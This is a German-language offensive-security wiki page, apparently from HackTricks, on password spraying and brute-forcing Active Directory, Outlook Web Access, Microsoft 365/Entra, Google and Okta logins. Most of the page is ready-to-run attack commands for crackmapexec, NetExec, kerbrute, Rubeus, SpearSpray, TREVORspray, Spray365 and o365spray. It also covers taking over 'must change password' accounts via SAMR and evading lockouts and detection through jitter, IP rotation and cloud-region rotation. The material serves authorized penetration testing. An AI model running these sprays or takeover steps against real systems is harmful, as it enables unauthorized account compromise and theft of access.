# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sobald du mehrere **gültige Benutzernamen** gefunden hast, kannst du für jeden der entdeckten Benutzer die **gängigsten Passwörter** ausprobieren (beachte dabei die password policy der Umgebung).\
**Standardmäßig** beträgt die **minimale** **Passwortlänge** 7.

Listen mit gängigen Benutzernamen können ebenfalls nützlich sein: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Beachte, dass du **einige Accounts sperren kannst, wenn du mehrere falsche Passwörter ausprobierst** (standardmäßig mehr als 10).

### Passwort policy abrufen

Wenn du über Zugangsdaten eines Benutzers oder eine shell als Domain-Benutzer verfügst, kannst du die password policy **mit folgendem Befehl abrufen**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation von Linux (oder allen)

- Verwendung von **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Verwendung von **NetExec (CME successor)** für gezieltes, geräuscharmes Spraying über SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Mit [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(du kannst die Anzahl der Versuche angeben, um Sperrungen zu vermeiden):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Verwendung von [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) – NICHT EMPFOHLEN, FUNKTIONIERT MANCHMAL NICHT<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Mit dem Modul `scanner/smb/smb_login` von **Metasploit**:

![Password Spraying - Brute-Force: Mit dem Modul scanner/smb/smb login von Metasploit](<../../images/image (745).png>)

- Mit **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Von Windows

- Mit [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Mit [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Es kann standardmäßig Benutzer aus der Domäne generieren, die Kennwortrichtlinie der Domäne abrufen und die Versuche entsprechend begrenzen):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Mit [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon"-Konten identifizieren und übernehmen (SAMR)

Eine unauffällige Technik besteht darin, ein harmloses/leeres Passwort zu sprühen und Konten abzufangen, die STATUS_PASSWORD_MUST_CHANGE zurückgeben. Dies zeigt an, dass das Passwort zwangsweise abgelaufen ist und ohne Kenntnis des alten Passworts geändert werden kann.<sup>[[9]](#references)[[10]](#references)</sup>

Arbeitsablauf:
- Benutzer enumerieren (RID brute über SAMR), um die Zielliste zu erstellen:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray ein leeres Passwort und fahre bei Treffern fort, um Konten zu erfassen, die bei der nächsten Anmeldung geändert werden müssen:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Für jeden Treffer das Passwort über SAMR mit dem NetExec-Modul ändern (kein altes Passwort erforderlich, wenn „must change“ gesetzt ist):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Betriebshinweise:
- Stelle sicher, dass die Uhr deines Hosts vor Kerberos-basierten Vorgängen mit dem DC synchronisiert ist: `sudo ntpdate <dc_fqdn>`.
- Ein [+] ohne (Pwn3d!) in einigen Modulen (z. B. RDP/WinRM) bedeutet, dass die Zugangsdaten gültig sind, das Konto jedoch keine Rechte für die interaktive Anmeldung besitzt.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth-Spraying mit LDAP-Targeting und PSO-bewusstem Throttling (SpearSpray)

Kerberos pre-auth-basiertes Spraying verursacht weniger Rauschen als SMB/NTLM/LDAP-Bind-Versuche und passt besser zu AD-Lockout-Richtlinien. SpearSpray kombiniert LDAP-gesteuertes Targeting, eine Pattern-Engine und Policy-Awareness (Domain-Policy + PSOs + badPwdCount-Puffer), um präzise und sicher zu sprühen. Außerdem können kompromittierte Principals in Neo4j markiert werden, um BloodHound-Pfade zu erstellen.<sup>[[1]](#references)</sup>

Wichtige Konzepte:
- LDAP-Benutzererkennung mit Paging und LDAPS-Unterstützung, optional mit benutzerdefinierten LDAP-Filtern.
- Domain-Lockout-Policy- und PSO-bewusstes Filtern, um einen konfigurierbaren Versuchspuffer (Threshold) einzuhalten und das Sperren von Benutzern zu vermeiden.
- Kerberos-pre-auth-Validierung mit schnellen gssapi-Bindings (erzeugt 4768/4771 auf DCs statt 4625).
- Pattern-basierte, benutzerbezogene Passwortgenerierung mit Variablen wie Namen und zeitlichen Werten, die aus dem pwdLastSet jedes Benutzers abgeleitet werden.
- Durchsatzkontrolle mit Threads, Jitter und einer maximalen Anzahl von Requests pro Sekunde.
- Optionale Neo4j-Integration, um eigene Benutzer für BloodHound zu markieren.

Grundlegende Verwendung und Discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Zielauswahl und Mustersteuerung:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth- und Sicherheitskontrollen:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound-Anreicherung:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Übersicht über das Pattern-System (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:

- Bevorzugt sollte der PDC-emulator mit -dc abgefragt werden, um den maßgeblichsten Wert für badPwdCount sowie policy-bezogene Informationen zu lesen.
- Das Zurücksetzen von badPwdCount wird beim nächsten Versuch nach Ablauf des Beobachtungsfensters ausgelöst; verwende threshold und timing, um sicher zu bleiben.
- Kerberos pre-auth-Versuche erscheinen in der DC-Telemetrie als 4768/4771; verwende jitter und rate-limiting, um dich unauffällig einzufügen.

> Tipp: Die standardmäßige LDAP page size von SpearSpray beträgt 200; passe sie bei Bedarf mit -lps an.

## Outlook Web Access

Es gibt mehrere Tools für **password spraying outlook**.

- Mit [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Mit [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Mit [Ruler](https://github.com/sensepost/ruler) (zuverlässig!)<sup>[[5]](#references)</sup>
- Mit [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Mit [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Um eines dieser Tools zu verwenden, benötigst du eine Benutzerliste und ein Passwort bzw. eine kleine Liste von Passwörtern zum Spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Beim Cloud-Spraying sollte zunächst festgestellt werden, ob der Tenant **verwaltet**, **föderiert** oder **hybrid** ist, da sich der Endpoint und das Lockout-Verhalten von lokalem AD unterscheiden können. In Microsoft Entra verändert **Smart Lockout**, wie wiederholte Versuche das Lockout-Budget aufbrauchen:<sup>[[7]](#references)</sup>

- Das Wiederholen desselben **falschen Passworts** erhöht den Lockout-Zähler nicht weiter, aber das Ausprobieren **neuer Kandidaten** schon.
- **Vertraute** und **unbekannte** Standorte haben **separate** Zähler.
- Tenants mit **Pass-through authentication (PTA)** profitieren nicht vom Tracking des Hashes falscher Passwörter. Behandle sie daher eher wie klassische, Lockout-sensitive Ziele.

In der Praxis sollte pro Runde **ein Passwort** gesprayed werden. Halte ausreichend Abstand zwischen den Runden und bevorzuge Tools, die den tatsächlichen Auth-Flow des Tenants erkennen können, bevor sie Versuche senden.

- Mit [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) kannst du den Tenant per Recon untersuchen, den `token_endpoint` erkennen, `msol`/`adfs`/`owa`/`okta` sprayen und den Traffic über mehrere Egress-IPs rotieren:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Mit [**Spray365**](https://github.com/MarkoH17/Spray365) können Sie einen fortsetzbaren **Ausführungsplan** vorab erstellen, die Reihenfolge der Authentifizierungen zufällig anordnen und eine **Mindestverzögerung pro Benutzer** erzwingen, um außerhalb des Sperrfensters zu bleiben:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Mit [**o365spray**](https://github.com/0xZDH/o365spray) kannst du den Tenant validieren, Benutzer mit Modulen wie `onedrive` enumerieren und über `oauth2` oder `adfs` sprayen, wobei **ein Versuch pro Benutzer** innerhalb jedes Sperrfensters eingehalten wird. Wenn du bereits über eine FireProx-API verfügst, übergib sie mit `--proxy-url`, um die Quell-IP-Adressen zu verteilen:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Die aktuelle Operator-Tradecraft hat sich auch in Richtung **distributed cloud spraying** entwickelt. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) unterstützt Zeitfenster, Passwort-Shuffling, ADFS/M365-Spraying und die automatische Exfiltration nach der Authentifizierung. Der aktuelle Missbrauch in der Praxis nutzte außerdem die **Microsoft Teams API** zur Account-Aufzählung und die Rotation von **AWS-Regionen**, um Spray-Wellen über mehrere geografische Ursprungsregionen zu verteilen.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referenzen

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
